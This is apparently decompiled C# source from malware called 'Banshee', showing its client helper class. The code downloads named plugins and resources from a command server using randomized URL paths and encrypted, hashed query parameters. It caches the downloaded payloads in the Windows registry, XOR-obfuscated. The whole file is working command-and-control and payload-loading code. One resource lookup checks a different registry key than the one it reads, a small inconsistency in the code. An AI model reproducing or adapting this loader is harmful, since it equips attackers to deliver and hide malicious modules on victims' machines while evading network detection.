﻿using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Text;

namespace Banshee.Client.Helper
{
	// Token: 0x0200010E RID: 270
	internal class Client
	{
		// Token: 0x060003A0 RID: 928 RVA: 0x0001E15C File Offset: 0x0001E15C
		public static byte[] GetPlugin(string name)
		{
			if (name == "Client")
			{
				return null;
			}
			if (RegeditKey.CheckValue("ao" + name))
			{
				return SimpleEncryptor.XorEncryptMyKey(Convert.FromBase64String(RegeditKey.GetValue("ao" + name)), 66);
			}
			byte[] array = Client.SendGet(new Dictionary<string, string>
			{
				{
					"command",
					"plugin"
				},
				{
					"name",
					name
				}
			});
			if (array == null)
			{
				return null;
			}
			RegeditKey.SetValue("ao" + name, Convert.ToBase64String(SimpleEncryptor.XorEncryptMyKey(array, 66)));
			return array;
		}

		// Token: 0x060003A1 RID: 929 RVA: 0x0001E1F4 File Offset: 0x0001E1F4
		public static byte[] GetResource(string name)
		{
			if (name == "Client")
			{
				return null;
			}
			if (RegeditKey.CheckValue("oa" + name))
			{
				return SimpleEncryptor.XorEncryptMyKey(Convert.FromBase64String(RegeditKey.GetValue("ao" + name)), 66);
			}
			byte[] array = Client.SendGet(new Dictionary<string, string>
			{
				{
					"command",
					"resource"
				},
				{
					"name",
					name
				}
			});
			if (array == null)
			{
				return null;
			}
			RegeditKey.SetValue("ao" + name, Convert.ToBase64String(SimpleEncryptor.XorEncryptMyKey(array, 66)));
			return array;
		}

		// Token: 0x060003A2 RID: 930 RVA: 0x0001E28C File Offset: 0x0001E28C
		public static string SendGetRequest(Dictionary<string, string> parameters)
		{
			byte[] array = Client.SendGet(parameters);
			if (array == null)
			{
				return null;
			}
			return SimpleEncryptor.Decrypt(Encoding.UTF8.GetString(array));
		}

		// Token: 0x060003A3 RID: 931 RVA: 0x0001E2B8 File Offset: 0x0001E2B8
		public static byte[] SendGet(Dictionary<string, string> parameters)
		{
			byte[] result;
			try
			{
				using (HttpClient httpClient = new HttpClient())
				{
					StringBuilder stringBuilder = new StringBuilder(Client.currentHost + RandomPathGenerator.GenerateCompletelyRandomPath());
					if (parameters.Count > 0)
					{
						stringBuilder.Append("?");
						foreach (KeyValuePair<string, string> keyValuePair in parameters)
						{
							stringBuilder.Append(SimpleEncryptor.Hash(keyValuePair.Key) + "=" + SimpleEncryptor.Encrypt(keyValuePair.Value) + "&");
						}
						StringBuilder stringBuilder2 = stringBuilder;
						int length = stringBuilder2.Length;
						stringBuilder2.Length = length - 1;
					}
					string requestUri = stringBuilder.ToString();
					httpClient.DefaultRequestHeaders.Add("User-Agent", "Banshee");
					result = httpClient.GetAsync(requestUri).Result.Content.ReadAsByteArrayAsync().Result;
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x040002E7 RID: 743
		public static string currentHost = string.Empty;
	}
}
